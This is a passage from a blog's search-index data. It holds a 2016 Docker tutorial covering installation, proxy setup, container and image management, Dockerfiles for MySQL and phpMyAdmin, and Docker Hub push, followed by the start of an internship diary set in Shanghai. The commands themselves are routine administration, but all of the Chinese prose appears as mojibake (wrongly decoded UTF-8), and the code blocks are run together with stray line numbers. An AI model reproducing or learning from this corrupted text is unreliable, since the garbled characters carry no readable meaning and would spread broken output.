docs&#x2F;devel[^BDD]: è¡Œä¸ºé©±åŠ¨å¼€å‘","tags":["docker"]},{"title":"docker usage","path":"/2016/09/09/docker-usage/","content":"0x00 startingå…¬å¸å‡†å¤‡å¼€å®¹å™¨é¡¹ç›®ä¸”æˆ‘è¢«åˆ†åˆ°äº†é¡¹ç›®ç»„ï¼Œä½†å¯¹å®¹å™¨æŠ€æœ¯ä¸€æ— æ‰€çŸ¥ï¼Œæ‰€ä»¥è¿™ä¸ª post æ¥è®°å½•ç›®å‰å·¥ä¸šç•Œä¸»æµå®¹å™¨æŠ€æœ¯ â€“docker çš„å®è·µè¿‡ç¨‹ã€‚ 0x01 whatâ€™s docker? Docker is the worldâ€™s leading software containerization platform. 0x02 why docker? Dockerâ€™s commercial solutions provide an out of the box CaaS environment that gives IT Ops teams security and control over their environment, while enabling developers to build applications in a self service way. With a clear separation of concerns and robust tooling, organizations are able to innovate faster, reduce costs and ensure security. 0x03 docker component client&#x2F;server: docker æ˜¯ä¸€ä¸ª c&#x2F;s æ¶æ„çš„æœåŠ¡.server æä¾›ä¸€å¥—å®Œæ•´ RESTful API. image: image æ˜¯ docker åˆ›å»ºå®¹å™¨çš„åŸºç¡€ï¼Œç›¸å½“äºæºç å¯¹äºç¨‹åºã€‚ registry: ç”¨æ¥åšé•œåƒç®¡ç†ï¼Œç›¸å½“äºæºç ä¸ git repo çš„å…³ç³»ã€‚ containers: è¿è¡Œèµ·æ¥çš„å®ä½“ï¼Œç›¸å½“äºå¤šä¸ªç¨‹åºã€‚ 0x04 review containerå®¹å™¨å‘å±•åˆ°ç°åœ¨é€æ­¥è¿›å…¥äº†æ ‡å‡†åŒ–è¿‡ç¨‹ï¼Œç›®å‰æœ‰å·¥ä¸šç•Œå¹¿æ³›æ˜¯ç”¨çš„ docker; è¿˜æœ‰ coreos å®šåˆ¶çš„ appc, ç›®å‰éµå¾ªçš„ appc çš„å®¹å™¨æŠ€æœ¯æœ‰ freebsd å¹³å°çš„ Jet Pack å’Œ Linux å¹³å°é€šè¿‡ C++ å®ç°çš„ Nose Cone. 0x10 bases usageè¿™é‡Œè®°å½•ä¸€ä¸‹ docker åœ¨å‘½ä»¤è¡Œä¸‹é¢æœ€è¿‘åŸºæœ¬çš„ç”¨æ³•ã€‚ 0x11 install &amp; configureinstallfedora24 ä¸‹é¢å®‰è£…å¦‚æ­¤å®¹æ˜“ã€‚ 123# sudo dnf install docker -y# sudo systemctl enable docker# sudo systemctl start docker http proxy[^systemd]å› ä¸ºå…¬å¸ç½‘ç»œå®‰å…¨ç­–ç•¥æ‰€ä»¥éœ€è¦é…ç½®ä»£ç†æœåŠ¡å™¨ã€‚ 12345678# sudo mkdir /etc/systemd/system/docker.service.dcat &lt;&lt; EOF &gt;&gt; /etc/systemd/system/docker.service.d/http-proxy.conf[Service]Environment=&quot;HTTP_PROXY=http://username:password@10.0.58.88:8080/&quot;EOF# sudo systemctl daemon-reload# sudo systemctl show --property=Environment docker# sudo systemctl restart docker 0x12 containers managementcreate containerè¿è¡Œä¸€ä¸ªåå­—å« sn0rt çš„å®¹å™¨ä¸”è¿›å…¥ bash. 12# sudo docker run -i --name sn0rt -t ubuntu:14.04 /bin/bashexit statusæŸ¥çœ‹å½“å‰æœåŠ¡å™¨çš„å®¹å™¨çŠ¶æ€ã€‚ 123# sudo docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESca06ea65dda8 ubuntu:14.04 &quot;/bin/bash&quot; 30 minutes ago Exited (0) About a minute ago sn0rt attach to containerå¼€å§‹æ›¾ç»åœæ­¢çš„å®¹å™¨ï¼Œé™„åŠ ä¸Šå»ï¼š 12# sudo docker start sn0rt# sudo docker attach sn0rt create demon container123456# sudo docker run --name sn0rt -d ubuntu:14.04 /bin/sh -c &quot;while true;do echo hello word; sleep 1; done&quot;51b1a48d762441717cec525e42022328417f1c5ff9b18c456dbde0a925db7d57# sudo docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES51b1a48d7624 ubuntu:14.04 &quot;/bin/sh -c &#x27;while tr&quot; 10 seconds ago Up 7 seconds sn0rt show logs123# sudo docker logs -ft sn0rt2016-09-09T03:30:47.986708000Z hello word2016-09-09T03:30:49.233008000Z hello word exec in containeråœ¨å®¹å™¨ä¸­è¿è¡Œä¸ªéäº¤äº’å¼è¿›ç¨‹ååœ¨è¿è¡Œäº¤äº’å¼è¿›ç¨‹ã€‚ 12345678# sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES51b1a48d7624 ubuntu:14.04 &quot;/bin/sh -c &#x27;while tr&quot; About an hour ago Up About an hour sn0rt# sudo docker exec -d sn0rt touch /tmp/linux# sudo docker exec -t -i sn0rt /bin/bashroot@51b1a48d7624:/# ls /tmp/linux /tmp/linuxroot@51b1a48d7624:/# inspect containerè·å–æ›´å¤šçš„ä¿¡æ¯ä»¥ json æ ¼å¼å±•ç¤ºï¼Œçœç•¥éƒ¨åˆ†ä»¥...ä»£æ›¿ã€‚ 12345678910111213# sudo docker inspect sn0rt[ &#123; &quot;Id&quot;: &quot;51b1a48d762441717cec525e42022328417f1c5ff9b18c456dbde0a925db7d57&quot;, &quot;Created&quot;: &quot;2016-09-09T03:28:16.986340741Z&quot;, &quot;Path&quot;: &quot;/bin/sh&quot;, &quot;Args&quot;: [ &quot;-c&quot;, &quot;while true; do echo hello word; sleep 1; done&quot; ], ... &#125;] stop and removeä¸èƒ½ç§»é™¤ä¸€ä¸ªåœ¨è¿è¡Œçš„å®¹å™¨ã€‚ 1234567# sudo docker stop sn0rtsn0rt# sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES# sudo docker rm sn0rtsn0rt# sudo docker rm `docker ps -a -q` 0x13 image managementå®¹å™¨é•œåƒçš„ç®¡ç†ï¼Œåå­—å«æ³•ç±»ä¼¼äº git. pull12345# sudo docker pull ubuntu:14.04Trying to pull repository docker.io/library/ubuntu ... 14.04: Pulling from docker.io/library/ubuntuDigest: sha256:5b5d48912298181c3c80086e7d3982029b288678fccabf2265899199c24d7f89Status: Image is up to date for docker.io/ubuntu:14.04 list1234# sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEtest latest d373bc5e4a77 20 hours ago 340.4 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB searchéœ€è¦å…ˆé€šè¿‡docker loginç™»å½• docker.io. 123# sudo docker search kaliINDEX NAME DESCRIPTION STARS OFFICIAL AUTOMATEDdocker.io docker.io/kalilinux/kali-linux-docker Kali Linux Rolling Distribution Base Image 216 [OK] remove123456789# sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEtest latest d373bc5e4a77 20 hours ago 340.4 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB# sudo docker rmi testUntagged: test:latest# sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB create(commit)æœ‰å‡ ç§æ–¹æ³•å¯ä»¥åˆ›å»ºè‡ªå·±çš„ image, è¿™é‡Œçºªå½•ä¸€ä¸‹ commit çš„ä½¿ç”¨ã€‚ 123456789101112# sudo docker run -i --name sn0rt -t ubuntu:14.04 /bin/bashroot@41f815d96b7a:/# apt-get update -yqqroot@41f815d96b7a:/# exit# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES41f815d96b7a ubuntu:14.04 &quot;/bin/bash&quot; 4 minutes ago Exited (0) 12 seconds ago sn0rt# docker commit -m=&quot;update finshed&quot; --author=&quot;Sn0rt@abc.shop.edu.cn&quot; 41f815d96b7a sn0rt/ubuntu_updatedsha256:92ae626c3fb58ad14b621d831bc8c1529357824ebbbdf1b2b4691b4d9e84814c# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsn0rt/ubuntu_updated latest 92ae626c3fb5 58 seconds ago 210.1 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB exportæœ‰æ—¶å€™ç½‘ç»œä¸å¥½ï¼Œæˆ–è€…æŸäº›é™åˆ¶å¯¼è‡´ä½ ä¸èƒ½é€šè¿‡ pull æ¥å®‰è£… image.docker æä¾›ä¸€ä¸ªå¯¼å‡ºçš„åŠŸèƒ½å¯ä»¥ä½¿ç”¨ã€‚ 1# docker save -o kubedns-amd64.tar gcr.io/google_containers/kubedns-amd64 importä¸Šé¢çš„å¯¼å‡ºæ–‡ä»¶ä½ å¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸ªå‘½ä»¤æŠŠè¿™ä¸ªæ–‡ä»¶å¯¼å…¥è¿›è‡ªå·±çš„ docker image. 1# docker load --input kubedns-amd64.tar 0x20 dockerfile[^dockerfile]è¿™æ˜¯å¦ä¸€ç§æ„å»ºè‡ªå·± image çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯å®˜æ–¹æ¨èçš„ (é«˜åº¦å¯å®šåˆ¶).åˆ©ç”¨ dockerfile æ„å»ºä¸‰ä¸ª images, å‘½åä¸º ubuntu,apache ä¸ mysql.å…¶ä¸­ apache ä¸ mysql åŸºäº ubuntu_updated, è€Œ ubuntu_updated æ˜¯åŸºäº ubuntu:14.04. ubuntuåŸºæœ¬ ubuntu é•œåƒåšä¸€ä¸ª update æ“ä½œå build ä¸€ä¸‹ï¼Œå¦‚æœä¸åšçš„è¯å…¶å® docker ä¹Ÿä¼šå¸®ä½ ç¼“å­˜ï¼Œdocker æ¯å‘½ä»¤æ¯é•œåƒ 1234567FROM ubuntu:14.04MAINTAINER Sn0rt &lt;Sn0rt@abc.shop.edu.cn&gt;ENV http_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;ENV https_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;RUN apt-get update -yqq å¦‚æœå†™é”™äº†å¯ä»¥ä¿®æ”¹Dockerfileé‡æ–° build, å®ƒä¼šè‡ªæœ€è¿‘ä¸€æ¬¡æ­£ç¡® image å¼€å§‹ç»§ç»­ build. 12345678910âœ ubuntu docker build -t=&quot;sn0rt/ubuntu&quot; . Sending build context to Docker daemon 2.048 kBStep 1 : FROM ubuntu:14.04 ---&gt; 4a725d3b3b1c...Step 5 : RUN apt-get update -yqq ---&gt; Running in 91e8e54e3be5 ---&gt; 8aae246f5e4cRemoving intermediate container 91e8e54e3be5Successfully built 8aae246f5e4c mysql1234567891011FROM sn0rt/ubuntuMAINTAINER Sn0rt &lt;Sn0rt@abc.shop.edu.cn&gt;ENV http_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;ENV https_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;RUN apt-get install mysql-server -yqqCOPY my.cnf /etc/mysql/my.cnfWORKDIR /rootCOPY init.sql init.sqlRUN /etc/init.d/mysql restart &amp;&amp; mysql &lt; init.sql building:12345678910111213141516# sudo docker build -t=&quot;sn0rt/mysql:v1&quot; .Sending build context to Docker daemon 7.168 kBStep 1 : FROM sn0rt/ubuntu ---&gt; 8aae246f5e4c...Step 9 : RUN /etc/init.d/mysql restart &amp;&amp; mysql &lt; init.sql ---&gt; Running in 73fd2bc50964 * Stopping MySQL database server mysqld ...done. * Starting MySQL database server mysqld ...done. * Checking for tables which need an upgrade, are corrupt or were not closed cleanly. ---&gt; 5d3c0a4fa4edRemoving intermediate container 73fd2bc50964Successfully built 5d3c0a4fa4ed apacheåˆ©ç”¨Dockerfileæ¥å®‰è£…phpmyadmin. 123456789101112131415161718FROM sn0rt/ubuntuMAINTAINER Sn0rt &lt;Sn0rt@abc.shop.edu.cn&gt;ENV http_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;ENV https_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;RUN apt-get install apache2 -yqqRUN apt-get install php5 libapache2-mod-php5 php5-mcrypt php5-mysql -yqqCOPY dir.conf /etc/apache2/mods-available/dir.confADD phpMyAdmin-4.6.4-all-languages.tar.gz /var/www/html/WORKDIR /var/www/html/phpMyAdmin-4.6.4-all-languages/RUN mv * ..COPY config.inc.php /var/www/html/config.inc.phpENTRYPOINT [&quot;apachectl&quot;]CMD [&quot;-X&quot;] building:12345678910âœ apache docker build -t=&quot;sn0rt/apache:v1&quot; . Sending build context to Docker daemon 10.38 MBStep 1 : FROM sn0rt/ubuntu ---&gt; 8aae246f5e4c...Step 13 : CMD -X ---&gt; Running in 45fa01e8ac4c ---&gt; 366ef630e06fRemoving intermediate container 45fa01e8ac4cSuccessfully built 366ef630e06f checking historyé€šè¿‡ history å‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ°å†å²å‘½ä»¤ã€‚ 1234567891011121314151617181920# sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZEsn0rt/apache v1 366ef630e06f 3 minutes ago 324.8 MBsn0rt/mysql v1 5d3c0a4fa4ed 2 hours ago 345.7 MBsn0rt/ubuntu latest 8aae246f5e4c 2 hours ago 210.1 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 2 weeks ago 187.9 MB# sudo docker history sn0rt/mysql:v1IMAGE CREATED CREATED BY SIZE COMMENT5d3c0a4fa4ed 20 minutes ago /bin/sh -c /etc/init.d/mysql restart &amp;&amp; mysql 5.252 MB 92dba0a2acb2 20 minutes ago /bin/sh -c #(nop) COPY file:77fac40c1774c2ad4 172 B c3df7fa0d3d1 20 minutes ago /bin/sh -c #(nop) WORKDIR /root 0 B ca7a6756a3c7 20 minutes ago /bin/sh -c #(nop) COPY file:30489e5e5529ad833 3.506 kB d06d1ddad673 20 minutes ago /bin/sh -c apt-get install mysql-server -yqq 130.3 MB 91190a6c9e32 22 minutes ago /bin/sh -c #(nop) ENV https_proxy=http://fnst 0 B 7d8936b1f833 22 minutes ago /bin/sh -c #(nop) ENV http_proxy=http://fnsts 0 B f08d8e1643b3 22 minutes ago /bin/sh -c #(nop) MAINTAINER Sn0rt &lt;Sn0rt@abc 0 B 8aae246f5e4c 48 minutes ago /bin/sh -c apt-get update -yqq 22.16 MB 091e0ec51c90 50 minutes ago /bin/sh -c #(nop) ENV https_proxy=http://fnst 0 B 43bff3143ad4 50 minutes ago /bin/sh -c #(nop) ENV http_proxy=http://fnsts 0 B 913e5f034797 50 minutes ago /bin/sh -c #(nop) MAINTAINER Sn0rt &lt;Sn0rt@abc 0 B usingéœ€è¦ä¸€ä¸ªå‰å°è¿›ç¨‹ï¼Œå¦‚æœä»¥ apache ä»¥æœåŠ¡åœ¨åå°å¯åŠ¨çš„è¯ï¼Œå®¹å™¨ä¼šå˜æˆé€€å‡ºçŠ¶æ€ã€‚ mysql12345# sudo docker run -d -p 3306:3306 --name mysql sn0rt/mysql:v1 mysqld_safeb946792318652c2d405406e66fbbaa7472a6a5a8dc281c71abe6fd8651070d46# sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb94679231865 sn0rt/mysql:v1 &quot;mysqld_safe&quot; 5 seconds ago Up 2 seconds 0.0.0.0:3306-&gt;3306/tcp mysql apacheå¯¹å¤–æœåŠ¡æä¾›ä»¥ä¸€ç›´çš„ ip åœ°å€ (å®¿ä¸»æœºå™¨çš„åœ°å€),apache ä»¥å‰å°è¿›ç¨‹åœ¨è¿è¡Œã€‚ 12345# docker run -d -p 80:80 --name apache sn0rt/apache:v1# sudo docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa478f202f3bf sn0rt/apache:v1 &quot;apachectl -X&quot; 47 seconds ago Up 44 seconds 0.0.0.0:80-&gt;80/tcp apacheb94679231865 sn0rt/mysql:v1 &quot;mysqld_safe&quot; 3 minutes ago Up 3 minutes 0.0.0.0:3306-&gt;3306/tcp mysql testingåœ¨å®¿ä¸»æœºå™¨ä¸Šé¢è¿›è¡Œæµ‹è¯• apache ä¸ mysql çš„ç«¯å£ç»‘å®šã€‚ 1234567891011121314151617181920212223# sudo curl -I localhostHTTP/1.1 200 OKDate: Mon, 12 Sep 2016 03:23:31 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.19Set-Cookie: pmaCookieVer=5; expires=Wed, 12-Oct-2016 03:23:31 GMT; Max-Age=2592000; path=/; httponlySet-Cookie: phpMyAdmin=npcfgt7puqs2cmld1ttk2k3naa7pv54a; path=/; HttpOnlyExpires: Mon, 12 Sep 2016 03:23:31 +0000...# sudo mysql -u root -p -h 172.17.0.1Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.5.50-0ubuntu0.14.04.1 (Ubuntu)Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.# sudo docker logs mysql160912 03:17:34 mysqld_safe Can&#x27;t log to error log and syslog at the same time. Remove all --log-error configuration options for --syslog to take effect.160912 03:17:34 mysqld_safe Logging to &#x27;/var/log/mysql/error.log&#x27;.160912 03:17:34 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql# sudo docker logs apacheAH00558: apache2: Could not reliably determine the server&#x27;s fully qualified domain name, using 172.17.0.3. Set the &#x27;ServerName&#x27; directive globally to suppress this message 0x30 dockerhubæµ‹è¯•å®Œæˆæ²¡æœ‰é—®é¢˜ï¼Œä¸”æ‰“ç®—åˆ†äº«ä½ çš„å®¹å™¨è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æŠŠå®ƒæ¨é€åˆ° dockerhub(è®°å¾—docker login). 123456789101112# sudo docker push sn0rt/ubuntuThe push refers to a repository [docker.io/sn0rt/ubuntu]54da5869939f: Pushed ffb6ddc7582a: Mounted from library/ubuntu 344f56a35ff9: Mounted from library/ubuntu 530d731d21e1: Mounted from library/ubuntu 24fe29584c04: Mounted from library/ubuntu 102fca64f924: Mounted from library/ubuntu latest: digest: sha256:703fec1e8c32ebc0da29d12be2515f640b9022e45c38df62a48145851ad651b6 size: 1549# sudo docker search sn0rt/ubuntuINDEX NAME DESCRIPTION STARS OFFICIAL AUTOMATEDdocker.io docker.io/sn0rt/ubuntu 1 0x40 summary[^docker-hype] layer: åˆæ­¥æ¥è§¦ docker å‘ç° layer è¿™æ ·çš„è®¾è®¡æ”¾åˆ°ç¯å¢ƒéƒ¨ç½²é‡Œé¢éå¸¸å®ç”¨ã€‚ä½†æ˜¯ç®—ä¸ä¸Šå®Œå…¨åˆ›æ–°ï¼Œè‡³å°‘æˆ‘ä¹‹å‰ vmware æœ‰å°è¯•è¿‡ç±»ä¼¼çš„æ¦‚å¿µï¼Œæˆ‘åŸºäºè™šæ‹Ÿæœºçš„æŸä¸ªé…ç½®å¯¹å…¶è¿›è¡Œå¿«ç…§ï¼Œç„¶åä»¥å¿«ç…§ä¸ºåŸºç¡€è¿›è¡Œä¸åŒçš„ä¿®æ”¹ï¼Œè¿™æ ·è‡ªå·±ç”¨èµ·æ¥æ˜¯æ²¡æœ‰å¤ªå¤šé—®é¢˜çš„ã€‚ dockerfile: docker å®˜æ–¹æä¾›çš„ dockerfile ç»„ç»‡è¿‡äºåŸå§‹ï¼Œé€€å›äº† shell éƒ¨ç½²æ—¶ä»£ï¼Œè€Œä¸” dockerfile build çš„ä¾èµ–å…³ç³»å±‚çº§åˆ’åˆ†æ˜¯é€šè¿‡å¤šä¸ª docker image æ¥å®ç°çš„ï¼Œè¿™æ ·è‡³å°‘ç›®å‰å¯èƒ½æ˜¯éœ€è¦æ‰‹å·¥è§£å†³ä¾èµ– (å®‰è£…é•œåƒ). security: docker çš„ Linux å®ç°ä¾èµ–äº namespace ä¸ cgroup,namepsace æœ¬èº«çš„å®‰å…¨æ€§ (CVE) ä¸ cgroup çš„é¢—ç²’åº¦æœ¬èº«éƒ½æ˜¯ä¸å®Œå–„çš„ (cgroup å¯¹ç½‘ç»œé™åˆ¶), ä»å®¹å™¨ä¸­é€¸å‡ºä¹Ÿä¸æ˜¯æ²¡æœ‰å¯èƒ½ã€‚ performance: KVM åœ¨è¿è¡ŒåŸºäºæ¨¡æ¿ç”Ÿæˆçš„è™šæ‹Ÿæœºå¯ä»¥åˆå¹¶ç›¸åŒå†…å­˜çš„ï¼Œå®¹å™¨æ˜¯å…±äº«å†…æ ¸çš„å¯ä»¥æƒ³è±¡ä¸€ä¸‹æ˜¯èŠ‚çº¦ä¸€ç‚¹å†…å­˜;cpu ä¸éœ€è¦åœ¨ guest å’Œ host ä¹‹é—´æ¥å›åˆ‡æ¢å¯èƒ½èŠ‚çº¦ä¸€ç‚¹ cpu æ—¶é—´ã€‚ limit: ä½œä¸ºä¸€ä¸ªè½¯ä»¶å®‰å…¨çˆ±å¥½è€…æœ‰æ—¶å€™å¯¹ kernel æœ¬èº«æ„Ÿå…´è¶£ï¼Œè¿™æ—¶å€™ docker å°±ä¸è¡Œäº†ã€‚ [^systemd]: systemd configure[^dockerfile]: dockfile manual[^docker-hype]: docker-hype","tags":["docker"]},{"title":"internship in Shanghai","path":"/2016/08/27/intern-in-shanghai/","content":"ä»åŒ—äº¬åˆ°ä¸Šæµ·ã€‚åŒ—æ–¹çƒ­ä¹Ÿä¸å—æ–¹ä¸ä¸€æ ·ï¼Œå—æ–¹çš„çƒ­è½¯ç»µç»µçš„å¥½åƒä¸­äº†åˆ†ç­‹é”™éª¨æ‰‹ä¸€æ ·æœ‰åŠ›ä½¿ä¸å‡ºæ¥ï¼ŒåŒ—æ–¹çš„çƒ­å¥½åƒé“ç ‚å¸ƒæ‰“ç£¨ç€ä½ è®©ä½ ç‹‚èºã€‚ è¯•ç‚¼ã®é­”éƒ½å…­æœˆä¸Šæ—¬ï¼Œå¯»æ€ç€äº¬åŸå¥½è¿œè€Œå®ä¹ è¡¥è´´å¾ˆå°‘ï¼Œå› æœªæ¯•ä¸šå¯¼è‡´å¾€è¿”å­¦æ ¡çš„å¼€é”€å¯¼è‡´æ”¶ä¸æŠµæ”¯ï¼Œå°±å‡†å¤‡åä¸œæ‰¾ä¸ªæ–°å®ä¹ å¹¶æå‡ºäº†ç¦»èŒã€‚ç„¶ååœ¨æ‹‰é’©ä¸Šé¢æŠ•äº†ä¸ªç®€å†ï¼Œå°±æ”¶åˆ°äº†é¢è¯•ï¼Œå’Œé¢è¯•å®˜ (ç°åœ¨çš„ leader) èŠèŠä¸€ä¸‹ Linux, ç„¶åå°±æ”¶åˆ°äº† offer, äºæ˜¯å°±æ¥åˆ°ç°åœ¨çš„é¥¿äº†ä¹ˆ â€“ ä¸€å®¶å¹´è½»çš„äº’è”ç½‘å…¬å¸ã€‚ é­”éƒ½åˆè®¿shanghai 7 æœˆ 4 æ—¥ï¼ŒæœŸæœ«è€ƒè¯•å®Œï¼Œå› ä¸ºå—äº¬ä¸æ–­ä¸‹é›¨å¯¼è‡´è€ƒå®Œå—äº¬å‡ æ—¥æ¸¸å¾—è®¡åˆ’æ³¡æ±¤äº†ï¼Œæ‰€ä»¥æå‰è·‘è·¯åˆ°ä¸Šæµ·æŠ•å¥”éƒå§¨ï¼Œå‡†å¤‡æå‰å…¥èŒã€‚æ—¶é—´å¥½å¿«ï¼Œä¸Šæ¬¡æ¥ä¸Šæµ·è¿˜æ˜¯ 2014 å¹´ 2 æœˆä¸‹æ—¬ï¼Œå½“æ—¶äº§ç”Ÿçš„å°è±¡å°±æ˜¯ä¸Šæµ·å¥½è´µï¼Œè¿™ä¸€æ¬¡é™¤äº†ç§Ÿæˆ¿å¯¹å¥½è´µçš„å°è±¡æœ‰æ‰€æ”¹å˜ã€‚ç§Ÿæˆ¿çœŸæ˜¯ä¸ªå¿ƒç—›çš„äº‹æƒ…ï¼Œä¸ºæ­¤è¿˜äº¤äº† 500 å—å­¦è´¹ï¼Œä¸€æŠŠè¾›é…¸æ³ªï¼å‘ç°æˆ¿å­ç¦»å¾—è¿‘ä¸”ä¸é”™çš„çš„è´µï¼Œç¦»å¾—è¿‘ä¸”ä¾¿å®œçš„å¾ˆç ´ï¼Œç¦»å¾—è¿œä¸”ä¸é”™çš„ä¹Ÿè´µï¼Œç¦»å¾—è¿œä¸”å°ä¸€ç‚¹ç›¸å¯¹ä¾¿å®œï¼Œç„¶åæˆ‘é€‰äº†ç¦»å¾—è¿œä¸”å°ä¸€ç‚¹çš„ã€‚ å…¥èŒ7 æœˆ 6 æ—¥ï¼Œå¤§æ¸…æ—©å¸¦ç€å¯¹æ–°å·¥ä½œä¸€ç‚¹æœŸæœ›èµ¶ç€ä¸Šæµ·çš„æ—©é«˜å³°ä¸Šè·¯äº†ï¼Œåœ°é“ä¸ŠäººçœŸåƒç½‘æ–‡é‡Œé¢æ‰€æè¿°çš„è®²æ²™ä¸é±¼ï¼Œå‰è¿›çš„é“å£³å°±æ˜¯ç½å¤´ï¼Œæ¯æ¡é±¼éƒ½å¸¦ç€æƒ…æ„¿æˆ–è€…ä¸æƒ…æ„¿çš„æƒ…ç»ªè¢«ç½å¤´è¿å»ç›®çš„åœ°ã€‚æˆ‘è¢«è¿™æ ·ä¸€æŒ¤ï¼Œå°±æœ‰ç‚¹æƒ…ç»ªï¼Œå¼€å§‹æ€è€ƒé±¼ç”Ÿçš„æ„ä¹‰ï¼Œä½œä¸ºä¸€ä¸ªæ²™ä¸é±¼åˆ°åº•ä¸ºäº†ä»€ä¹ˆï¼Ÿå¯èƒ½æ²™ä¸é±¼çš„ä¸€ç”Ÿæœ¬èº«æ˜¯æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰çš„ï¼Œåªæœ‰ç‹¬ç«‹é±¼æ ¼æ‰èƒ½èµ‹äºˆå®ƒé±¼ç”Ÿçš„æ„ä¹‰å§ã€‚è¢«è¿åˆ°ç›®çš„åœ°ï¼Œç­¾å®ŒåˆåŒåŠå®Œæ–°äººå…¥èŒæ‰‹ç»­ï¼Œé¢†äº†æ–° mac pro, è¿‡äº†å‡ å¤©é¢†äº†é‚£ä¸ªå¾ˆè´µçš„æ¤…å­ï¼Œåˆè¿‡äº†è¿‡äº†ä¸€æ®µæ—¶é—´é¢†äº†æ˜¾ç¤ºå™¨ï¼Œè¿™æ ·çš„å¾…é‡ä¼ ç»Ÿè¡Œä¸šçœŸçš„ä¸æ•¢æƒ³ï¼Œäº’è”ç½‘å…¬å¸çœŸæ˜¯æ—¶ä»£çš„å¼„æ½®å„¿ã€‚7 æœˆ 6 æ—¥ 6 ç‚¹ä¸‹ç­ï¼Œè¿½è®¨è¢«å‘çš„ 500 å—ï¼Œèº«å¿ƒç–²æƒ«ï¼Œåä¸Šå›ä¹äº­çš„åœ°é“ä¸Šåˆå¼€å§‹æ€è€ƒé±¼ç”Ÿçš„æ„ä¹‰ï¼Œæœ‰ç§æ„Ÿè§‰å‡ºæ‹³å¡è¿›äº†æ£‰èŠ±ï¼Œè¿›å…¥äº†è´¤è€…æ¨¡å¼ã€‚ teamå·¥ä½œäº†ä¸€æ®µæ—¶é—´å¯ä»¥æ„Ÿè§‰åˆ°å›¢é˜Ÿæœ‰æ´»åŠ›ï¼ŒåŒäº‹ä¹Ÿå¾ˆå‰å®³ï¼ é‡è¦çš„æ˜¯ team æœ‰çˆ±ï¼Œä»¥å›¾ä¸ºè¯ï¼š å¦¹å­ å·¥ä½œTeam æ˜¯å¹´åæˆç«‹çš„ï¼Œæƒ³èµ·æ¥è€å¤§åƒé¥­æ—¶å€™çš„ä¸€å¥åæ§½ï¼š æ²¡æœ‰ç»„å»º sre team ä¹‹å‰æˆ‘æ˜¯çœŸæ­£çš„ sre, ç°åœ¨æˆ‘æ˜¯ team è´Ÿè´£å‚åŠ ä¼šçš„ã€‚ åœ¨ SRE team, æˆ‘ä¸»è¦æ˜¯å®è·µä¸€äº›åº•å±‚æŠ€æœ¯ï¼Œå…·ä½“åº”ç”¨åœ¨æ’éšœï¼Œè°ƒä¼˜ï¼Œå†™ä¸€äº› linux ç›¸å…³çš„éœ€æ±‚ï¼Œéƒ½æ˜¯è›®å¥½ç©çš„ã€‚æˆ‘çš„ mentor å°±æ˜¯è€å¤§ï¼Œè€å¤§æ˜¯å…¬å¸å‰ 100 å·å‘˜å·¥ï¼ŒæŠ€æœ¯äº†å¾—ï¼Œäººç§°æ±¤ç¥ï¼æœ‰æ—¶å€™æ˜¯å’Œå­™è€å¸ˆä¸€èµ·ç©ï¼Œä»–é¼“åŠ±ç‹¬ç«‹æ€è€ƒï¼Œå®è·µè‡ªå·±æƒ³æ³•ï¼Œå……åˆ†å°Šé‡æ€ç»´å¤šæ ·æ€§; å¯¹æ€ç»´å¤šæ ·æ€§çš„å°Šé‡æ˜¯æˆ‘çŸ¥é“ä½†æ˜¯æ²¡æœ‰å¤ªè®¤çœŸä»˜è¯¸å®è·µçš„ä¸œè¥¿ï¼Œåœ¨è¿™é‡Œå—æ•™äº†ï¼ ç”Ÿæ´»è¿™æ¬¡å®ä¹ æ¯”ä¹‹å‰å¤šäº†åœ°é“è·¯ç¨‹ï¼Œ50 åˆ†é’Ÿå•ç¨‹çš„è½¦ç¨‹æ„Ÿè§‰æœ‰ç‚¹è¿œï¼Œä½†æ˜¯ä¸€æƒ³ä¸­ç¯é™„è¿‘çš„æˆ¿ç§Ÿå°±å¹³è¡¡å¥½å¤šäº†ï¼Œç§Ÿæˆ¿çš„ä»·æ ¼ä¹Ÿæ¯”åŒ—äº¬ä¾¿å®œå¤ªå¤šäº†ã€‚é­”éƒ½å¯¹æ¯”äºäº¬åŸå¯¹æˆ‘æ¥è¯´ä¼˜åŠ¿ï¼šç¦»å®¶è¿‘ï¼Œæ°”å€™æ¹¿æ¶¦ï¼Œé›¾éœ¾ä¸æ˜¯ç‰¹åˆ«å‡ºåï¼Œç¦»å­¦æ 